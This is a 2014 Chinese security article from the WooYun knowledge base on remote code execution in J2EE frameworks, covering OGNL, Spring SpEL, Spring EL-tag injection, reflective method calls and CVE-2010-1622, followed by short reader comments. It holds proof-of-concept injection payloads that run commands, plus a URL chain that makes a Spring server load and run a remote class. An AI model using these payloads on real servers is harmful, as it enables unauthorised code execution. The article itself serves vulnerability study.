<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">J2EE远程代码执行那些事儿(框架层面)</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Nebula</a> <span class="bull">·</span> <time title="2014/02/11 17:14" ui-time="" datetime="2014/02/11 17:14" class="published ng-binding ng-isolate-scope">2014/02/11 17:14</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>在J2EE远程代码执行中,大部分的代码执行情况的本质是,能够从外部去直接控制Java对象(其他语言暂不讨论,其实也差不多),控制Java对象大致包括几种情况:直接new对象;调用对象的方法(包括静态方法);访问对象的属性(赋值)等</p><p>那么一些J2EE框架在设计之中,如果某些功能允许以上操作,可能出现的远程代码执行情况。</p><h2>0x01 OGNL</h2><hr><p>参考：<a href="http://drops.wooyun.org/papers/340">http://drops.wooyun.org/papers/340</a></p><p>get方式，调用对象的静态方法执行命令：</p><pre><code>...
OgnlContext context = new OgnlContext();
Ognl.getValue("@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d9b3b8afb8f7b5b8b7bef78bacb7adb0b4bc99bebcad8bacb7adb0b4bc">[email&#160;protected]</a>().exec('calc')",context,context.getRoot());
...  
</code></pre><p><img alt="2014021112460957891.png" img-src="81720ef4cc4a01b484d8a96b1b9d29d23ddcc2ec.jpg"></p><p>set方式，new一个对象调用方法执行命令：</p><pre><code>...
OgnlContext context = new OgnlContext();
Ognl.setValue(new java.lang.ProcessBuilder((new java.lang.String[] {"calc" })).start(), context,context.getRoot());
...  
</code></pre><p>那么我们在使用OGNL实现某些J2EE框架功能或者机制中，如果getValue或setValue函数是允许外部参数<strong>直接完整内容</strong>传入的，那肯定是很危险的！！！</p><p>比如：webWork及Struts2框架（其实真是不想说，Struts2简直就是在拖Java安全水平的后腿。它所有OGNL远程执行代码的漏洞的形成，可以用一句话简单概括：<strong>在使用OGNL实现框架某些功能或机制时，允许外部参数直接传入OGNL表达式或安全限制被饶过等</strong>）</p><h2>0x02 在spring框架中也有类似OGNL的Spel表达式</h2><hr><h3>1.调用对象的静态方法执行命令:</h3><pre><code>...
org.springframework.expression.Expression exp=parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')");
...   
</code></pre><p><img alt="2014021112491712314.png" img-src="374b68afe5c95ede3f91476162553646b85b8983.jpg"></p><h3>2.new一个对象调用方法执行命令:</h3><pre><code>...
org.springframework.expression.Expression exp=parser.parseExpression("new java.lang.ProcessBuilder((new java.lang.String[]{'calc'})).start()");
... 
</code></pre><p><img alt="2014021112505361561.png" img-src="b74d8211b0d820780929428f1f8a537246ea6abe.jpg"></p><p>但spring在安全方面应该不会像struts2一样这么不负责任（不过，现在稍微好点了！），它有没有类似的安全漏洞，有兴趣的可以去找找 ^-^</p><h2>0x03 spring 标签实现中的el表达式注入</h2><hr><p>例如，类似的代码场景：</p><pre><code>...
el: &lt;spring:message text="${param.el}"&gt;&lt;/spring:message&gt;
... 
</code></pre><p>之前是个信息泄露漏洞（路径及jar等信息）：</p><p><img alt="2014021112525255051.png" img-src="6282341806f68c7e754ab38979f2f110c5ccde44.jpg"></p><p>前段时间老外弄出了远程命令执行,部分exp（网上都有，有兴趣自己找试一下。能否执行代码和web容器有很大关系，最好选老外一样的Glassfish或者resin某些版本用反射技巧实现执行代码）:</p><pre><code>http://127.0.0.1:8080/spring/login.jsp?el=${pageContext.request.getSession().setAttribute("exp","".getClass().forName("java.util.ArrayList").newInstance())}
</code></pre><p><br></p><pre><code>http://127.0.0.1:8080/spring/login.jsp?el=${pageContext.request.getSession().getAttribute("exp").add(pageContext.getServletContext().getResource("/").toURI().create("http://127.0.0.1:8080/spring/").toURL())}
</code></pre><p><br></p><pre><code>http://127.0.0.1:8080/spring/login.jsp?el=${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute("exp").toArray(pageContext.getClass().getClassLoader().getParent().getURLs())).loadClass("exp").newInstance()} 
</code></pre><p>原理简单描述：远程加载一个exp.class,在构造器中执行命令（利用对象初始化执行代码）.(因为其他web服务器对象方法调用被限制，所以执行恶意代码肯定会有问题)</p><p><strong>这个漏洞重要的是学习它的利用技巧！</strong>实际危害其实不大！</p><h2>0x04 反射机制实现功能时，动态方法调用</h2><hr><p>参考：<a href="http://zone.wooyun.org/content/6971">http://zone.wooyun.org/content/6971</a></p><p>其实，这篇文章主要给出的是<strong>反射机制使用不当造成的方法越权访问</strong>漏洞类型场景，而不是struts2这个漏洞本身，可能大家都<strong>怀恋</strong>之前一系列struts2轻松getshell的exp了！</p><p>简化后的伪代码:</p><pre><code>... 
Class clazz = 对象.getClass(); 
Method m = clazz.getDeclaredMethod("有实际危害的方法"); 
m.invoke(对象);   
...
</code></pre><p>原理简单描述：本质其实很简单，getDeclaredMethod的函数如果允许外部参数输入，就可以直接调用方法了，也就是执行代码，只是危害决定于调用的方法的实际power！</p><h2>0x05 spring class.classLoader.URLs[0]对象属性赋值</h2><hr><p>cve-2010-1622 这是我最喜欢的一个漏洞利用技巧：</p><p><img alt="2014021112554878852.png" img-src="6e7a01bbad790fae869236f46e4e6c49c5f9fd0b.jpg"></p><p>这个利用有点绕，其实如果看得懂Java其实也很简单！（大家常说，<strong>喜欢熬夜的coder不是好员工</strong>，睡觉了！）</p><p>以前看了很多篇漏洞分析文章，其中这篇不错（说得算比较清晰），推荐它：</p><p><a href="http://www.iteye.com/topic/1123382">http://www.iteye.com/topic/1123382</a></p><p>另外，其实我个人觉得，这个漏洞的其他利用的实际危害要超过执行命令方式，比如：拒绝服务等</p><p>如果把你想像力再上升一个层面:在<strong>任意场景</strong>中只要能够控制Java对象,理论上它就能执行代码(至于是否能够被有效利用是另外一回事)。其实说得再执白点，写底层代码的程序员知不知道这些问题可能导致安全漏洞！</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141029134414dab631e232f29abd6908a1eacf4f6ae3.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-25 20:20:35</span></div><p></p><p>学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">genxor</span> <span class="reply-time">2014-02-17 11:50:41</span></div><p></p><p>赞一个，学习了！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mr.Anderson</span> <span class="reply-time">2014-02-12 13:04:09</span></div><p></p><p>关于第五个，如果在数组的属性既有get也有set，那么漏洞应该可以规避吧？ 多谢楼主赐教</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lucky</span> <span class="reply-time">2014-02-11 17:19:14</span></div><p></p><p>不错！</p><p></p></div></div></div></div></div></main>